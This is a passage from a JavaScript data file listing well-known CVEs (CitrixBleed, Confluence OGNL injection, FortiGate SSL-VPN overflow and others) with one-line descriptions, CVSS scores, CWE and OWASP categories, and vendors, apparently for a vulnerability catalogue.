  {id:'CVE-2023-4966',y:2023,d:'CitrixBleed: NetScaler session leak, MFA bypass.',v:9.4,s:'CRITICAL',c:'CWE-125',o:'A02',ve:'Citrix',p:'Citrix'},
  {id:'CVE-2021-40438',y:2021,d:'Apache mod_proxy SSRF via unix: URI.',v:9.0,s:'CRITICAL',c:'CWE-918',o:'A10',ve:'Apache',p:'Apache'},
  {id:'CVE-2022-21907',y:2022,d:'Windows http.sys wormable RCE (HTTP Trailer).',v:9.8,s:'CRITICAL',c:'CWE-787',o:'A06',ve:'Microsoft',p:'Microsoft'},
  {id:'CVE-2022-26134',y:2022,d:'Confluence OGNL injection unauth RCE.',v:9.8,s:'CRITICAL',c:'CWE-74',o:'A03',ve:'Atlassian',p:'Atlassian'},
  {id:'CVE-2023-20198',y:2023,d:'Cisco IOS XE WebUI: create priv-15 user unauth.',v:10.0,s:'CRITICAL',c:'CWE-420',o:'A07',ve:'Cisco',p:'Cisco'},
  {id:'CVE-2024-21887',y:2024,d:'Ivanti Connect Secure command injection unauth.',v:9.1,s:'CRITICAL',c:'CWE-77',o:'A03',ve:'Ivanti',p:'Ivanti'},
  {id:'CVE-2021-26084',y:2021,d:'Confluence Widget Connector OGNL RCE.',v:9.8,s:'CRITICAL',c:'CWE-74',o:'A03',ve:'Atlassian',p:'Atlassian'},
  {id:'CVE-2024-1708',y:2024,d:'ConnectWise ScreenConnect path traversal (chained with CVE-2024-1709 auth bypass).',v:8.4,s:'HIGH',c:'CWE-22',o:'A01',ve:'ConnectWise',p:'ConnectWise'},
  {id:'CVE-2023-0669',y:2023,d:'GoAnywhere MFT Java deserialization RCE.',v:7.2,s:'HIGH',c:'CWE-502',o:'A08',ve:'Fortra',p:'Fortra'},
  {id:'CVE-2023-27997',y:2023,d:'FortiGate SSL-VPN heap overflow pre-auth RCE.',v:9.8,s:'CRITICAL',c:'CWE-122',o:'A07',ve:'Fortinet',p:'Fortinet'},
  {id:'CVE-2022-1388',y:2022,d:'F5 BIG-IP X-F5-Auth-Token bypass → RCE.',v:9.8,s:'CRITICAL',c:'CWE-306',o:'A07',ve:'F5',p:'F5'},
  {id:'CVE-2023-46604',y:2023,d:'ActiveMQ OpenWire ClassInfo RCE CVSS 10.',v:10.0,s:'CRITICAL',c:'CWE-502',o:'A08',ve:'Apache',p:'Apache'},
  {id:'CVE-2023-4911',y:2023,d:'Looney Tunables: glibc GLIBC_TUNABLES LPE.',v:7.8,s:'HIGH',c:'CWE-122',o:'A06',ve:'GNU',p:'GNU'},
  {id:'CVE-2022-47966',y:2022,d:'ManageEngine SAML deserialization RCE.',v:9.8,s:'CRITICAL',c:'CWE-502',o:'A08',ve:'Zoho',p:'Zoho'},
  {id:'CVE-2021-44515',y:2021,d:'ManageEngine Desktop Central auth bypass.',v:9.8,s:'CRITICAL',c:'CWE-287',o:'A07',ve:'Zoho',p:'Zoho'},
  {id:'CVE-2022-26923',y:2022,d:'AD CS: CSR manipulation → domain admin cert.',v:8.8,s:'HIGH',c:'CWE-295',o:'A01',ve:'Microsoft',p:'Microsoft'},
  {id:'CVE-2021-45046',y:2021,d:'Log4j2 Thread Context Map lookup bypass first patch.',v:9.0,s:'CRITICAL',c:'CWE-917',o:'A06',ve:'Apache',p:'Apache'},
  {id:'CVE-2024-27198',y:2024,d:'TeamCity auth bypass: create admin via REST.',v:9.8,s:'CRITICAL',c:'CWE-288',o:'A07',ve:'JetBrains',p:'JetBrains'},
  {id:'CVE-2022-3786',y:2022,d:'OpenSSL punycode buffer overflow in X.509 email.',v:7.5,s:'HIGH',c:'CWE-121',o:'A02',ve:'OpenSSL',p:'OpenSSL'},
  {id:'CVE-2023-29324',y:2023,d:'Windows MSHTML URI validation bypass.',v:6.5,s:'MEDIUM',c:'CWE-20',o:'A05',ve:'Microsoft',p:'Microsoft'},
  {id:'CVE-2022-36537',y:2022,d:'ZK Framework /zkau/* info disclosure.',v:7.5,s:'HIGH',c:'CWE-200',o:'A05',ve:'Potix',p:'Potix'},
  {id:'CVE-2023-28252',y:2023,d:'Windows CLFS driver LPE to SYSTEM.',v:7.8,s:'HIGH',c:'CWE-122',o:'A01',ve:'Microsoft',p:'Microsoft'},
];

  Object.assign(DATA, { MODS, CVES });
})();
